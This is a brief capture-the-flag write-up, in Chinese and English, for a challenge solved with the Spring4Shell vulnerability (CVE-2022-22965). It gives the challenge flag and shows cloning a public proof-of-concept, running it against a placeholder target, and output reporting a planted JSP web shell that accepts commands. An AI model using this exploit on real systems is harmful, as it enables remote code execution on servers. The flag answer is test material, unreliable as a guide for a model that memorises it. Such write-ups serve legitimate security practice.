## How Beautiful Spring Is

### description

春天多美好啊，只可惜疫情来了……

猫猫在春天里做了什么梦呢？



### flag

`tjctf{W0w_y0u_F1nd_m3ow's_Dr3@m_iN_SpR1n9}`



### writeup

CVE-2022-22965: Spring-Core-Rce, a.k.a. spring4shell

随便找个 poc 打一打就行了。

```bash
$ git clone https://github.com/reznok/Spring4Shell-POC
$ cd Spring4Shell-POC
$ python3 exploit.py --url http://ip:port/api/meow
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://ip:port/shell.jsp?cmd=id
```

flag 在 根目录下的 `/'.fl@g_1$_h3re'`